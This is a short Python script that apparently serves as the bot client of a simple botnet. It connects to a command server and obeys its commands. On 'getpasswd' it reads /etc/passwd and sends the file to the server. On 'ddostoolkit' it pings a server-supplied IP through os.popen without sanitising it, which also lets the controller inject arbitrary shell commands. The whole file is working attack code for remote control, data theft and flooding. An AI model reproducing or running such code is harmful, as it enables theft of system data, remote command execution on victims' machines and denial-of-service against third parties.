import socket
import os
import subprocess

from _thread import *

PORT = 3000
HOST = '127.0.0.1'

class color:
    # defines the colors on the console, taken from blender:
    # https://svn.blender.org/svnroot/bf-blender/trunk/blender/build_files/scons/tools/bcolors.py
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

s = socket.socket()

print(" [" + color.OKBLUE + "i" + color.ENDC + "] Trying to connect to the server...")

try:
    s.connect((HOST, PORT))

except:
    print(" [" + color.FAIL + "!" + color.ENDC + "] There was an error connecting to the server.")


while True:
    op = s.recv(1024).decode("utf-8")
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Operation received:", op)
    if op == "getpasswd":
        stream = os.popen('cat /etc/passwd')
        cat = stream.read()
        s.send(str.encode(cat))

    elif op == "ddostoolkit":
        ddos_ip = s.recv(1024).decode("utf-8")
        ddos_query = 'ping -c 10 ' + ddos_ip
        print(" [" + color.OKBLUE + "i" + color.ENDC + "] Now ddosing with: ", ddos_query)
        s.send(str.encode(' [' + color.OKGREEN + 'i' + color.ENDC + '] DDoSing target...'))
        try:
            stream = os.popen(ddos_query)
            print(" [" + color.OKBLUE + "i" + color.ENDC + "] Operation complete.")

        except:
            print(" [" + color.FAIL + "!" + color.ENDC + "] There was an error.")


    elif op == "!EXIT":
        exit()

    # if response.decode('utf-8') == "1":
    #     s.send(str.encode("OPCION 1 RECIBIDA!!"))

